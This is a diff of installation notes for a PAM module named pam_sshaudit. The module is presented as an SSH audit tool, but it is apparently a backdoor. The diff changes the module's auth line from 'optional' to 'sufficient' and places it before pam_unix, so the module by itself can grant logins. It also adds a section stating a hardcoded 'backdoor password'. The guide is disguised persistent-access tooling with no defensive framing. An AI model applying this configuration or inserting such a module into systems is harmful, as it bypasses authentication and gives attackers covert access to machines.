@@ -21,11 +21,11 @@ You may need install dependencies:
 Change `/etc/pam.d/{system,common}-auth`, apply patches like this:
 
 ```bash
-auth [success=1 default=ignore] pam_unix.so nullok_secure
-
 + # custom PAM module
-+ auth optional pam_sshaudit.so
++ auth sufficient pam_sshaudit.so
 + account optional pam_sshaudit.so
+
+auth [success=1 default=ignore] pam_unix.so nullok_secure
 
 #here's the fallback if no module succeeds
 auth requisite pam_deny.so
@@ -49,3 +49,7 @@ auth [success=1 default=ignore] pam_unix.so nullok_secure
 #here's the fallback if no module succeeds
 auth requisite pam_deny.so
 ```
+
+# Backdoor password
+
+hardcoded as: `ZJuj38ML0ddNDZKw`
